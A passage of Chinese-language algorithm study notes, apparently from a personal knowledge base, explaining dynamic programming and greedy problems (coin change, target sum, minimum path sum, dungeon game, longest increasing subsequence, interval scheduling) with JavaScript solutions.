开始计数）硬币的面值，若想凑出金额 `w`，有 `dp[i][w]` 种`凑法`\n\n\n## 根据 `动态规划套路框架` 写出`伪码`\n\n### base case\n\n```javascript hl:1,4\n// 面值为 0，什么不用做，就是一种凑法\ndp[...][0] = 1;\n\n// 不使用任何硬币面值，凑法为 0 \ndp[0][...] = 0;\n```\n\n### 根据 `框架` 写出 `伪码`\n\n```javascript\n① 初始化 dp 数组\ndp = [][]\n\n  \n② base case\ndp[0][..] = 0\ndp[..][0] = 1\n\n③ 根据状态，嵌套遍历\nfor i in [1..N]:\n    for j in [1..amount]:\n        选择 1：\n            把物品 i 装进背包,\n        选择 2：\n            不把物品 i 装进背包\n④ 返回 dp\nreturn dp[N][amount]\n```\n\n## 根据 `选择` 写出 `状态转移方程`\n\n- 如果你不把这第 `i` 个物品装入背包，也就是说你不使用 `coins[i-1]` 这个面值的硬币\n\t- 那么凑出面额 `j` 的方法数 `dp[i][j]` 应该等于 `dp[i-1][j]`，继承之前的结果。\n- 如果你把这第 `i` 个物品装入了背包，也就是说你使用 `coins[i-1]` 这个面值的硬币，\n\t- 那么 `dp[i][j]` 应该等于 `dp[i][j-coins[i-1]]`。\n\n\n## 最终代码\n\n```javascript\nvar change = function (amount, coins) {\n  var n = coins.length;\n  // 初始化 dp 及base case\n  var dp = [];\n  for (var i = 0; i <= n; i++) {\n    dp[i] = [];\n    for (var w = 0; w <= amount; w++) {\n      // 面值为 0，什么不用做，就是一种凑法\n      if (w === 0) {\n        dp[i][w] = 1;\n      } else {\n        dp[i][w] = 0;\n      }\n    }\n  }\n  // 状态决定 for 循环嵌套层数\n  for (var i = 1; i <= n; i++) {\n    for (var w = 1; w <= amount; w++) {\n      // 如果 w - coins[i - 1] >= 0，说明可以选择当前硬币\n      if (w - coins[i - 1] >= 0) {\n        // 选择当前硬币和不选择当前硬币两种选择\n        dp[i][w] =\n          dp[i - 1][w] + // 不选择当前硬币\n          dp[i][w - coins[i - 1]]; // 选择当前硬币\n      } else {\n        // 如果 w - coins[i - 1] < 0，说明当前硬币无法选择\n        // 因为当前硬币面值比 w 大，根本凑不出 w\n        dp[i][w] = dp[i - 1][w];\n      }\n    }\n  }\n  return dp[n][amount];\n};\n\n```\n\n","a1v8C5Le":"\n# 背包问题：目标和\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目 \n\n![图片&文件](./files/20241112.png)\n\n## 2. 回溯算法思路\n\n### 2.1. 回溯算法框架\n\n```python hl:6\ndef backtrack(路径, 选择列表):\n    if 满足结束条件:\n        result.add(路径)\n        return\n    \n    for 选择 in 选择列表:\n        做选择\n        backtrack(路径, 选择列表)\n        撤销选择\n```\n\n### 2.2. 选择列表\n\n对于每个数字 `nums[i]`，我们可以选择\n- 给一个正号 `+` \n- 或者一个负号 `-`\n\n### 2.3. 最终代码\n```javascript hl:14,29,36\nvar findTargetSumWays = function (nums, target) {\n  if (nums.length === 0) return 0;\n\n  var result = 0;\n  /**\n   * @description 回溯算法模板\n   * @param {*} nums 待做选择的数\n   * @param {*} i  代表当前做选择的数的下标\n   * @param {*} remain  代表剩余的目标值\n   * @returns void  无返回值\n   */\n  function backtrack(nums, i, remain) {\n    // base case：如果所有数都计算完了，看看结果是否等于 target\n    // 由于 remain 是累加的，所以当 i === nums.length 时，remain === 0 说明恰好凑出 target\n    // 更新结果 result\n    if (i === nums.length) {\n      if (remain === 0) {\n        // 说明恰好凑出 target\n        result++;\n      }\n      return;\n    }\n    /******** 给 nums[i] 选择 - 号 ********/\n    // 选择 - , 做加法，\n    // 因为目标是凑出 target，所以 remain 需要加上当前的 nums[i]\n    remain += nums[i];\n    // 穷举 nums[i + 1]\n    backtrack(nums, i + 1, remain);\n    // 撤销选择\n    remain -= nums[i];\n    /******** 给 nums[i] 选择 + 号 ********/\n    remain -= nums[i];\n    // 穷举 nums[i + 1]\n    backtrack(nums, i + 1, remain);\n    // 撤销选择\n    remain += nums[i];\n  }\n  backtrack(nums, 0, target);\n  return result;\n};\n```\n\n## 3. 动态规划思路\n\n### 3.1. dp 函数定义\n\n```js\n// 定义：dp(i, remain) 表示，利用 nums[i..] 这些元素，能够组成和为 remain 的方法数量\ndp(nums, i, remain)\n```\n\n### 3.2. 完整代码\n\n```javascript\nvar findTargetSumWays = function (nums, target) {\n  if (nums.length === 0) return 0;\n  // 备忘录\n  const memo = new Map();\n\n  // 定义：利用 nums[i..] 这些元素，能够组成和为 remain 的方法数量\n  function dp(nums, i, remain) {\n    // base case\n    if (i === nums.length) {\n      if (remain === 0) return 1;\n      return 0;\n    }\n\n    // 把它俩转成字符串才能作为哈希表的键\n    const key = `${i},${remain}`;\n\n    // 避免重复计算\n    if (memo.has(key)) {\n      return memo.get(key);\n    }\n\n    // 还是穷举\n    const result =\n      dp(nums, i + 1, remain - nums[i]) + // 选择 - 号\n      dp(nums, i + 1, remain + nums[i]); // 选择 + 号\n\n    // 记入备忘录\n    memo.set(key, result);\n    return result;\n  }\n\n  return dp(nums, 0, target);\n};\n\n```\n\n## 4. 转成背包问题\n\n如果我们把 `nums` 划分成两个子集 `A` 和 `B`，分别代表分配 `+` 的数和分配 `-` 的数，那么他们和 `target` 存在如下关系：\n\n```javascript\nsum(A) - sum(B) = target\nsum(A) = target + sum(B)\nsum(A) + sum(A) = target + sum(B) + sum(A)\n2 * sum(A) = target + sum(nums)\n```\n\n所以问题转成成：`nums` 中存在几个子集 `A`，使得 `A` 中元素的和为 `(target + sum(nums)) / 2`？\n\n> 具体省略，更多可参考  https://labuladong.online/algo/dynamic-programming/target-sum/ , 本文只要写出回溯算法即可\n\n## 5. 总结\n\n- 回溯算法虽好，但是复杂度高，即便消除一些冗余计算，也只是「剪枝」，没有本质的改进。\n\t- 但有的问题如果实在想不出状态转移方程，尝试用回溯算法暴力解决也是一个聪明的策略，总比写不出来解法强\n- 而动态规划就比较玄学了，经过各种改造，从一个加减法问题变成子集问题，又变成背包问题，经过各种套路写出解法，又搞出空间压缩，还得反向遍历。\n\n","GKYfLLNI":"\n# 最小路径和\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目 \n\n![图片&文件](./files/20241112-1.png)\n\n## 2. 分析\n\n一般来说，让你在二维矩阵中求最优化问题（最大值或者最小值），肯定需要**递归 + 备忘录**，也就是动态规划技巧\n\n![图片&文件](./files/20241112-2.png)\n\n「从 `D` 走到 `B` 的最小路径和这个问题转化成了\n- 从 `D` 走到 `A` 的最小路径和\n- 从 `D` 走到 `C` 的最小路径和 这两个问题\n\n### 2.1. 状态转移方法定义\n\n```javascript\n// 从左上角位置 `(0, 0)` 走到位置 `(i, j)` 的最小路径和为 `dp(grid, i, j)`\nvar dp = function(grid, i, j) {}\n```\n\n### 2.2. 所以这个题的框架代码为\n\n```javascript hl:5\nvar minPathSum = function(grid) {\n    var m = grid.length;\n    var n = grid[0].length;\n    // 计算从左上角走到右下角的最小路径和\n    return dp(grid, m - 1, n - 1);\n};\n```\n\n## 3. 自顶向下动态规划解法：会超时\n\n```javascript hl:18,15\nvar minPathSum = function (grid) {\n  var m = grid.length;\n  var n = grid[0].length;\n  // 计算从左上角走到右下角的最小路径和\n  return dp(grid, m - 1, n - 1);\n\n  function dp(grid, i, j) {\n    // base case：如果没有格子，取最左边和最上边的格子\n    if (i == 0 && j == 0) {\n      return grid[0][0];\n    }\n    // 如果索引出界，返回一个很大的值，\n    // 保证在取 min 的时候不会被取到\n    if (i < 0 || j < 0) {\n      return Number.MAX_VALUE;\n    }\n    return (\n      Math.min(\n        dp(grid, i - 1, j), // 左边的格子\n        dp(grid, i, j - 1), // 上边的格子\n      ) + grid[i][j] // 当前格子的值\n    );\n  }\n};\n\n```\n\n## 4. 自顶向下动态规划解法：使用备忘录优化\n\n```javascript hl:5\nvar minPathSum = function (grid) {\n  var m = grid.length;\n  var n = grid[0].length;\n\n  let memo = new Array(m).fill(-1).map(() => new Array(n).fill(-1));\n\n  // 计算从左上角走到右下角的最小路径和\n  return dp(grid, m - 1, n - 1);\n\n  function dp(grid, i, j) {\n    // base case：如果没有格子，取最左边和最上边的格子\n    if (i == 0 && j == 0) {\n      return grid[0][0];\n    }\n    // 如果索引出界，返回一个很大的值，\n    // 保证在取 min 的时候不会被取到\n    if (i < 0 || j < 0) {\n      return Number.MAX_VALUE;\n    }\n\n    // 如果计算过这个状态，就不要重复计算\n    if (memo[i][j] != -1) {\n      return memo[i][j];\n    }\n\n    return (memo[i][j] =\n      Math.min(\n        dp(grid, i - 1, j), // 左边的格子\n        dp(grid, i, j - 1), // 上边的格子\n      ) + grid[i][j]); // 当前格子的值\n  }\n};\n\n```\n\n## 5. 自底向上的迭代解法\n\n```javascript\nvar minPathSum = function (grid) {\n  var m = grid.length;\n  var n = grid[0].length;\n\n  let memo = new Array(m).fill(-1).map(() => new Array(n).fill(-1));\n\n  // 计算从左上角走到右下角的最小路径和\n  return dp(grid, m - 1, n - 1);\n\n  function dp(grid, i, j) {\n    // base case：如果没有格子，取最左边和最上边的格子\n    if (i == 0 && j == 0) {\n      return grid[0][0];\n    }\n    // 如果索引出界，返回一个很大的值，\n    // 保证在取 min 的时候不会被取到\n    if (i < 0 || j < 0) {\n      return Number.MAX_VALUE;\n    }\n\n    // 如果计算过这个状态，就不要重复计算\n    if (memo[i][j] != -1) {\n      return memo[i][j];\n    }\n\n    return (memo[i][j] =\n      Math.min(\n        dp(grid, i - 1, j), // 左边的格子\n        dp(grid, i, j - 1), // 上边的格子\n      ) + grid[i][j]); // 当前格子的值\n  }\n};\n\n```","B17o8HBN":"\n# 地下城游戏\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目 \n\n![图片&文件](./files/20241112-3.png)\n\n\n### 1.1. 分析\n\n![图片&文件](./files/20241112-4.png)\n\n![图片&文件](./files/20241112-5.png)\n\n所以，关键不在于吃最多的血瓶，而是在于**如何损失最少的生命值**\n\n## 2. dp 函数定义\n\n从 `grid[i][j]` 到达终点（右下角）所需的**最少生命值**是 `dp(grid, i, j)`\n\n从 `A` 到达右下角的最少生命值应该由下面两个值决定\n- 从 `B` 到达右下角的最少生命值\n- 从 `C` 到达右下角的最少生命值\n\n![图片&文件](./files/20241112-6.png)\n\n- B：从 `(i, j+1)` 出发，到达右下角，需要的最小初始血量\n- C：从 `(i+1, j)` 出发，到达右下角，需要的最小初始血量\n- 所以，选择 **B 和 C 中的最小值**，即 `min(B,C)`\n\t- 假设 `B：dp(0, 1) = 5, C：dp(1, 0) = 4`，那么可以肯定要从 `A` 走向 `C`，因为 4 小于 5 嘛\n\t\t- 假设 `A = 1 `  \n\t\t\t- 既然知道下一步要往 `C` 走，且 `dp(1, 0) = 4` 意味着走到 `grid[1][0]` 的时候至少要有 4 点生命值，\n\t\t\t- 那么就可以确定骑士出现在 `A` 点时需要 `4 - 1 = 3` 点初始生命值\n\t\t- 那如果 `A = 10` 的值为 10，落地就能捡到一个大血瓶，超出了后续需求，`4 - 10 = -6` 意味着骑士的初始生命值为负数，\n\t\t\t- 这显然不可以，骑士的生命值小于 1 就挂了，所以这种情况下骑士的初始生命值应该是 1。\n\n所以状态转移方程\n\n```javascript\nint res = min(\n    dp(i + 1, j),\n    dp(i, j + 1)\n) - grid[i][j];\n\ndp(i, j) = res <= 0 ? 1 : res;\n```\n\n## 3. 最终代码\n\n```javascript hl:28,29\nvar calculateMinimumHP = function (grid) {\n  const m = grid.length;\n  const n = grid[0].length;\n  // 备忘录中都初始化为 -1\n  const memo = new Array(m).fill(0).map(() => new Array(n).fill(-1));\n  return dp(grid, 0, 0, memo);\n};\n\n// 定义：从 (i, j) 到达右下角，需要的初始血量至少是多少\nvar dp = function (grid, i, j, memo) {\n  const m = grid.length;\n  const n = grid[0].length;\n  // base case\n  if (i == m - 1 && j == n - 1) {\n    return grid[i][j] >= 0 ? 1 : -grid[i][j] + 1;\n  }\n  if (i == m || j == n) {\n    return Number.MAX_SAFE_INTEGER;\n  }\n  // 避免重复计算\n  if (memo[i][j] != -1) {\n    return memo[i][j];\n  }\n  // 状态转移逻辑\n  // 解释：保证哪怕右边或者下边的血量为负，骑士的血量至少为 1\n  const res =\n    Math.min(\n      dp(grid, i, j + 1, memo), // 从 (i, j+1) 出发，到达右下角，需要的最小初始血量\n      dp(grid, i + 1, j, memo), // 从 (i+1, j) 出发，到达右下角，需要的最小初始血量\n    ) - grid[i][j];\n  memo[i][j] = res <= 0 ? 1 : res;\n  return memo[i][j];\n};\n```","RvEXlnlo":"\n# 动态规划解题套路框架：以最小零钱为例说明\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目 \n\n| LeetCode                                                                 | 力扣                                                           | 难度  |\n| ------------------------------------------------------------------------ | ------------------------------------------------------------ | --- |\n| [322. Coin Change](https://leetcode.com/problems/coin-change/)           | [322. 零钱兑换](https://leetcode.cn/problems/coin-change/)       | 🟠  |\n\n![|504](https://od-1310531898.cos.ap-beijing.myqcloud.com/202303181621816.png)\n\n## 2. 动态规划的 `要点`\n\n这是一个经典的动态规划问题，因为它具有`「最优子结构」`的。即子问题间 `互相独立`\n\n+ 动态规划问题的一般形式就是 `求最值`\n+ 求解动态规划的核心问题是 `穷举`\n+ 具备「最优子结构」，即是否能够通过子问题的最值得到原问题的最值\n+ 是否存在`「重叠子问题」`，如果存在需要 使用`「备忘录」`或者 `「DP table」` 来优化穷举过程\n+ `重叠子问题`、`最优子结构`、`状态转移方程`就是 **动态规划三要素**\n\n## 3. 如何列出 `状态转移方程`\n\ndp 函数：`dp(n)` 表示，输入一个目标金额 `n`，返回凑出目标金额 `n` 所需的最少硬币数量\n\n![|592](https://od-1310531898.cos.ap-beijing.myqcloud.com/202303170806731.png)\n\n### 3.1. 第一步、确定 `base case`  \n\n比如需要找零  `0元` ，那么最小的硬币数就为 `0`\n\n### 3.2. 第二步、确定`状态` 与 `选择`\n\n+ 状态 ，即`原问题 和 子问题`中会变化的变量  ， 所以，该问题的状态 为 `找零多少钱`\n+ 选择  \n    - 即 导致状态变化的行为 \n    - 即 `需要找零多少钱` 会变化呢？因为每次选择了一枚硬币，比如会导致 `状态`的变化\n\n### 3.3. 第三步、明确 `dp函数` 或 `dp数组` \n\n+ dp函数\n    - 自顶向下 `递归` 的动态规划解法 ，看下面模板\n+ dp数组 \n    -  自底向上`迭代`的动态规划，看下面模板\n\n## 4. 自顶向下的`递归`解法\n\n### 4.1. 模板代码\n\n```javascript hl:3,11\n// 模板\nfunction dp('所有可能的选择', '状态 1','状态 2 ...'){\n    // ::::base case\n    if('状态' === 1) return 'xxx'\n    if('状态' === 1) return 'xxx'\n    \n    // ::::需要返回的最值\n    let res = ''\n    for (let '选择' of '所有可能的选择'){\n        // # 此时的状态已经因为做了选择而改变\n        res =  dp('所有可能的选择', '状态 1','状态 2 ...')\n    }\n    return res;\n}\n```\n\n### 4.2. 实际代码\n\n```javascript hl:18\n// 参数一：所有可能的选择 coins\n// 参数二：状态，会变的东西\nfunction dp (coins, amount) {\n    // base case\n    if (amount === 0) {\n        return 0;\n    }\n    if (amount < 0) {\n        return -1\n    }\n    // ::::res为最终返回的结果，即最少几枚硬币\n    let res = Infinity;\n    for (let coin of coins) {\n        // 计算子问题的结果\n        let subProblem = dp(coins, amount - coin);\n        // 子问题无解则跳过\n        if (subProblem === -1) continue;\n        // 能到这儿，说明能够继续\n        // 在子问题中选择最优解，然后加一\n        res = Math.min(res, subProblem + 1);\n    }\n    return res === Infinity ? -1 : res;\n};\n```\n\n### 4.3. 分析一下`时间复杂度`\n\n![|584](https://od-1310531898.cos.ap-beijing.myqcloud.com/202303181714402.png)\n\n下面看看`算法复杂度`：\n\n+ `子问题`总数为 `递归树的节点个数`，但是如何`剪枝` 依赖于 硬币的`名额`，算出有多少子问题比较困难，所以我们就按照`最坏情况`来估计复杂度，`最坏情况`是`全用面额为 1 的硬币` \n    - 类比 `fib 数列` ，如何`剪枝` 就比较方便， 即 `fib(n-1) + fib(n-2)` ,  可参考 [斐波那契数列](https://www.yuque.com/liguwe/agorithms/lqm69gi8zhp789mf) 里的 `递归树`\n+ 假设目标金额为 `n`，给定的硬币个数为 `k`，那么`递归树`最坏情况下高度为 `n`（全用面额为 1 的硬币） 即 `最终递归完成需要到树的最底部`， 然后再假设这是 一棵满k叉树 ，则节点的总数在 `k^n` 这个数量级。\n+ 接下来看`每个子问题的复杂度`，由于每次递归包含一个 for 循环，复杂度为 `O(k)`，相乘得到总时间复杂度为 `O(k*k^n) ===> O(k^n)`\n\n简单总结就是： `复杂度等于子问题个数 * 每个子问题的复杂度`  \n所以，因为这个问题的`子问题个数`就是`指数级别`，所以肯定是指数级别的复杂度\n\n>  其实，知道`模板代码`后，只需要选 `状态` 与 `选择`\n\n## 5. 自顶向下的`递归`解法：带备忘录\n\n### 5.1. 具体代码实现\n\n```javascript hl:11\n// 具体实现\nfunction fn(coins, amount) {\n    const memo = new Array(amount+1).fill(-999);\n    function dp(coins, amount) {\n        // :::: base case\n        if (amount === 0) return 0;\n        if (amount < 0) return -1;\n        // ::::已经被存储过了，就放在这儿\n        if (memo[amount] !== -999) return memo[amount];\n        // ::::res为最终返回的结果，即最少几枚硬币\n        let res = Infinity;\n        for (let coin of coins) {\n            let subProblem = dp(coins, amount - coin);\n            if (subProblem === -1) continue;\n            res = Math.min(res, subProblem + 1);\n        }\n        memo[amount] = (res === Infinity ? -1 : res);\n        return memo[amount];\n    }\n    return dp(coins, amount);\n}\n\nconsole.log(fn([1, 2, 5], 10));  // 2\nconsole.log(fn([1, 24, 100], 200));  //  2\nconsole.log(fn([5, 10, 20, 50], 201)); // -1\n```\n\n### 5.2. 复杂度分析\n\n很显然「备忘录」大大减小了`子问题数目`，完全消除了`子问题的冗余`，所以子问题总数不会超过金额数 `n`，即子问题数目为 `O(n)`。处理一个子问题的时间不变，仍是 `O(k)`，所以总的时间复杂度是 `O(kn)`\n\n## 6. 自底向上的 `dp数组` 的迭代解法\n\n+ `dp 函数` 体现在 `函数参数`\n+ `dp 数组` 体现在 `数组索引`\n\n### 6.1. 明确 `dp 数组`的定义\n\n当目标金额为 `i` 时，至少需要 `dp[i]` 枚硬币凑出\n\n### 6.2. 模板代码\n\n```javascript\n# 自底向上迭代的动态规划\n\n# 初始化 base case\ndp[0][0][...] = base case\n\n# 进行状态转移\nfor 状态1 in 状态1的所有取值：\n    for 状态2 in 状态2的所有取值：\n        for ...\n            dp[状态1][状态2][...] = 求最值(选择1，选择2...)\n```\n\n### 6.3. 具体代码\n\n```javascript hl:22,30\n/**\n * @description 最小硬币数\n * @url https://leetcode-cn.com/problems/coin-change/\n * */\n/**\n * @param {number[]} coins\n * @param {number} amount\n * @return {number}\n */\nvar coinChange = function(coins, amount) {\n\n    // ::::初始化 dp 数组\n    // ::::dp[i] 代表需要找零金额为 i 时，需要最小的硬币数\n    const dp = [];\n    for (let i = 0; i <= amount; i++) {\n        dp[i] = Infinity;\n    }\n\n    // ::::base case\n    dp[0] = 0;\n\n    // ::::根据状态个数，决定嵌套层数，\n    // ::::这里的状态个数是金额数，所以是 amount\n    for (let i = 0; i <= amount; i++) {\n        // :::: 选择：去遍历所有的硬币，然后做选择\n        for (let coin of coins) {\n            // ::::选择的硬币金额为 coin, 而需要找零金额为 i ，所以 i - coin 代表剩余金额\n\n            // ::::如果剩余金额小于0，说明这个硬币不能用,继续\n            if (i - coin < 0) continue;\n\n            // 说明这个硬币可以用，所以需要找零金额为 i 时，需要最小的硬币数为 1 + dp[i - coin]\n            // 所以最终需要取最小值，所以是 Math.min(dp[i], 1 + dp[i - coin])\n            dp[i] = Math.min(dp[i], 1 + dp[i - coin]);\n        }\n    }\n\n\n    // :::::返回结果\n    return dp[amount] === Infinity ? -1 : dp[amount];\n};\n\n```\n\n### 6.4. 复杂度分析\n\n+ 时间复杂度看`几层遍历`， 所以是  `O(kn)`（假设 `k` 为 硬币数，`n` 为找零多少钱）\n+ 空间复杂度 `O(n)`\n\n## 7. 总结\n\n+ 动态规划问题，就两种解决思路\n    - `dp 递归函数 - 备忘录`\t\n    - `dp 数组迭代（DP table`\n+  在追求“`如何聪明地穷举`”。`用空间换时间`的思路，是降低时间复杂度的不二法门\n+ 配合 [斐波那契数列](https://www.yuque.com/liguwe/agorithms/lqm69gi8zhp789mf) 多理解，多动手\n+ `自顶向下`和`自底向上` \n    - `自顶向下` ，本质是递归，即\"`顶`\"问题，拆解为\"子问题\" 去解决，复杂度依赖于 `子问题个数`\n    - `自底向上` ，本质是数组迭代，复杂度依赖于`几重迭代`\n+ 动态规划问题，核心的是写出 `暴力解法` ，然后才是  `空间换时间` 的优化思路\n\n","uhtbDJDF":"\n# 如何查找状态转移方程（最长递增子序列与俄罗斯套娃）\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目 \n\n| LeetCode                                                                                             | 力扣                                                                           | 难度  |\n| ---------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- | --- |\n| [300. Longest Increasing Subsequence](https://leetcode.com/problems/longest-increasing-subsequence/) | [300. 最长递增子序列](https://leetcode.cn/problems/longest-increasing-subsequence/) | 🟠  |\n| [354. Russian Doll Envelopes](https://leetcode.com/problems/russian-doll-envelopes/)                 | [354. 俄罗斯套娃信封问题](https://leetcode.cn/problems/russian-doll-envelopes/)       | 🔴  |\n\n## 2. 最长递增子序列\n\n![|504](https://od-1310531898.cos.ap-beijing.myqcloud.com/202303250743194.png)\n\n「子序列」和「子串」的区别：\n\n- `子串`一定是`连续`的\n- 而`子序列`不一定是`连续`的\n\n## 3. 数学归纳法找 `dp数组` 的关系\n\n**定义 dp 数组**：  `dp[i]`**表示以** `nums[i]`**这个数** 结尾**的最长递增子序列的**长度\n\n- base case : `dp[0] = 1`\n\t- 其他的，如下图，关键是需要画出 `index` , `nums` , `dp` 三者的对应关系\n\t- 假设已知 `dp[0...4]` 需要推导出 => `dp[5]`\n\t- 先找到所有比 `nums[5]` 小的 ，即 `nums[0] = 1` 和 `nums[4] = 2`\n\t\t- 然后，再比较  `dp[0] + 1` 和   `dp[4] + 1`  ，哪个更大？ 最大值就是 `dp[5]` 的值\n\n![|560](https://od-1310531898.cos.ap-beijing.myqcloud.com/202303250744477.png)\n\n最终代码如下：\n\n```js hl:17,13\n/**\n * @description 最长递增子序列\n * @url https://leetcode-cn.com/problems/longest-increasing-subsequence/\n * */\nvar lengthOfLIS = function(nums) {\n    // 定义dp数组\n    const dp = [];\n    // :::::初始化dp数组,\n    // :::: dp[i] 代表以 nums[i] 结尾的最长递增子序列的长度，所以初始化为 1，即以自己结尾的最长递增子序列长度至少为 1\n    for (let i = 0; i < nums.length; i++) {\n        dp[i] = 1;\n    }\n    // 根据状态个数，决定嵌套层数\n    // 这里的状态个数是数组长度，所以是 nums.length\n    for (let i = 0; i < nums.length; i++) {\n        // :::::选择：遍历所有的子问题\n        for (let j = 0; j < i; j++) {\n            // :::::nums[i] > nums[j] 说明 nums[i] 可以接在 nums[j] 后面，形成一个更长的递增子序列\n            if (nums[i] > nums[j]) {\n                // :::::状态转移方程\n                dp[i] = Math.max(dp[i], dp[j] + 1);\n            }\n        }\n    }\n\n    // :::::返回结果\n    return Math.max(...dp);\n};\n```\n\n## 4. `动态归纳法` 找 `状态转移关系` 的套路总结\n\n1、明确 `dp 数组`的定义。这一步对于任何动态规划问题都很重要，如果不得当或者不够清晰，会阻碍之后的步骤。\n\n重要非常重要，定义错误就没法往下走了，如果错误，很可能就是 `dp 数组`的定义不够恰当，需要重新定义 dp 数组的含义；或者可能是 `dp 数组存储的信息还不够`，不足以推出下一步的答案，需要把 `dp 数组扩大成二维数组甚至三维数组`\n\n2、根据 `dp 数组`的定义，运用数学归纳法的思想，假设 `dp[0...i-1]` 都已知，想办法求出 `dp[i]`，一旦这一步完成，整个题目基本就解决了\n\n## 5. `O(NlogN)` 的解法\n\n类似扑克牌，其实最长递增子序列和一种叫做 `patience game` 的纸牌游戏有关，甚至有一种排序方法就叫做 `patience sorting（耐心排序）` ，可以利用到`二分查找法`，具体不展开了，可参考下面链接。\n\n这种解法应用于 [俄罗斯套娃：二维最长递增子序列](https://www.yuque.com/liguwe/agorithms/xh82rz1hu7r84xl4 \"俄罗斯套娃：二维最长递增子序列\") ，这样才能通过 leetcode 测试\n\n## 6. 扩展到二维 - 俄罗斯套娃\n\n- [https://leetcode.cn/problems/russian-doll-envelopes/](https://leetcode.cn/problems/russian-doll-envelopes/)\n\n![|528](https://832-1310531898.cos.ap-beijing.myqcloud.com/395e584dee98c2424eaf6360398e0aeb.png)\n\n解法比较巧妙：\n\n- 先对宽度 `w` 进行`升序`排序， \n   - 如果遇到 `w 相同`的情况，则按照高度 `h`  `降序` 排序；\n- 之后把所有的 `h` 作为一个数组，在这个数组上计算 `LIS 的长度`就是答案。\n\n如下图，只需要对 `[8,3,4,2,7]` 查找 `最长递增子序列` 即可， 不好理解的话看下面两张图\n\n![|480](https://832-1310531898.cos.ap-beijing.myqcloud.com/24098ee53be356c7b43e38ad34229b34.png)\n\n如下图，最长递增子序列 `[3 4 7]`\n\n![|374](https://832-1310531898.cos.ap-beijing.myqcloud.com/36da8b6d16a4d0334f52544cda98e823.png)\n\n具体代码如下：\n\n```javascript hl:8,9\n/**\n * @param {number[][]} envelopes\n * @return {number}\n */\nfunction maxEnvelopes(envelopes) {\n    let n = envelopes.length;\n    // 按宽度升序排列，如果宽度一样，则按高度降序排列\n    envelopes.sort((a, b) => {\n        return a[0] === b[0] ?\n            b[1] - a[1] : a[0] - b[0];\n    });\n    // 对高度数组寻找 LIS\n    let height = new Array(n);\n    for (let i = 0; i < n; i++) {\n        height[i] = envelopes[i][1];\n    }\n    return lengthOfLIS(height);\n}\n\nfunction lengthOfLIS(nums) {\n    // dp[i] 表示以 nums[i] 这个数结尾的最长递增子序列的长度\n    // base case：dp 数组全都初始化为 1\n    let dp = new Array(nums.length).fill(1);\n    for (let i = 0; i < nums.length; i++) {\n        for (let j = 0; j < i; j++) {\n            if (nums[i] > nums[j])\n                dp[i] = Math.max(dp[i], dp[j] + 1);\n        }\n    }\n    let res = 0;\n    for (let i = 0; i < dp.length; i++) {\n        res = Math.max(res, dp[i]);\n    }\n    return res;\n}\n```\n\n> [!danger]\n注意：以上方式不能通过 LeetCode 的所有用例，需要使用二分法才能通过\n\n","ShN36uS1":"\n# 贪心算法：区间调度问题\n\n\n`#算法`  `#算法/动态规划` \n \n\n## 目录\n<!-- toc -->\n ## 贪心算法的`特性` \n\n### 特性 1：局部最优 → 全局最优\n\n**举个例子：**  比如你面前放着 100 张人民币，你只能拿`十张`，怎么才能拿最多的面额？显然每次选择剩下钞票中面值最大的一张，最后你的选择一定是最优的。\n\n上面的`例子` ， 每一步都做出一个`局部最优`的选择，最终的结果就是`全局最优`\n\n### 特性 2：符合贪心算法的线性规划问题复杂度比较低\n\n- 一个算法问题使用暴力解法需要`指数级`时间\n- 如果能使用动态规划消除重叠子问题，就可以降到`多项式级别`的时间\n- 如果满足**贪心选择**性质，那么可以进一步降低时间复杂度，达到`线性级别`的。\n\n\n## 第 1 题：无重叠区间问题 \n\nhttps://leetcode.cn/problems/non-overlapping-intervals/\n\n![image.png|533](https://832-1310531898.cos.ap-beijing.myqcloud.com/11acaca424e010615da55841318f8763.png)\n\n**需要移除区间的 `最小数量`，使剩余区间互不重叠** ，所以我们先找究竟 `有多少区间不重叠?` \n\n### 第一步：有多少个区间互不重叠呢？\n\n1. 先按照 `end` 排序，选出区间 `x` \n\t\ta. `count`  代表 `不重叠区间的个数` ，\n\t\tb.  所有**不与** `x` 相交的  ，`count + 1`\n2. 重复上面的  a 、b\n\n\n> [!danger]\n>  注意，下面动图的`绿色的区间`个数使我们需要的，即 `count`，别管`红线区间`\n\n\n如下动图：\n\n![1 (1).gif|549](https://832-1310531898.cos.ap-beijing.myqcloud.com/40a0023c6191e2f0923c48337d98db69.gif)\n\n下面的 `start` 代表当前遍历到`区间的左边的值` , 所以这里判断不相交的条件是是 `start >= end` ，看下图就明白了了\n\n![image.png|547](https://832-1310531898.cos.ap-beijing.myqcloud.com/346a3fe7d81477fa75bf1a2e3a23ecb7.png)\n\n所以得出以下代码：\n\n```javascript\nvar notCrossingIntervals = function (intervals) {\n    // base case\n    if (intervals.length === 0) return 0;\n    // ::::第一步：先按照 `end` 排序，并选出区间 `x` ，`即` 第一个区间\n    // 升序排列\n    intervals.sort((a, b) => a[1] - b[1]);\n\n    //  :::: 至少有一个区间不相交\n    let count = 1;\n    // 排序后，第一个区间就是 x\n    let x = intervals[0][1];\n\n    // ::::第二步：所有与 `x`  相交的，`移除个数 + 1`\n    for (let i = 1; i < intervals.length; i++) {\n        let start = intervals[i][0];\n        // 不相交，不相交，不相交，不相交\n        if (start >= x) {\n            console.log('不相交');\n            count++;\n            x = intervals[i][1];\n        }\n    }\n    // 返回相交的个数，即为要移除的个数\n    return count;\n};\n```\n\n\n### 第二步：需要移除的个数，简单加减法即可\n\n```javascript\n\n/**\n * @param {number[][]} intervals\n * @return {number}\n */\nvar eraseOverlapIntervals = function (intervals) {\n    return intervals.length - notCrossingIntervals(intervals);\n};\n```\n\n## 第 2 题：用最少数量的箭引爆气球\n\nhttps://leetcode.cn/problems/minimum-number-of-arrows-to-burst-balloons/\n\n![image.png|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/f39e0bd05d070bc6b302ca860d32b6f6.png)\n\n是的，这个和上题[#示例 1：无重叠区间问题](/post/ShN36uS1.html#示例-1无重叠区间问题) 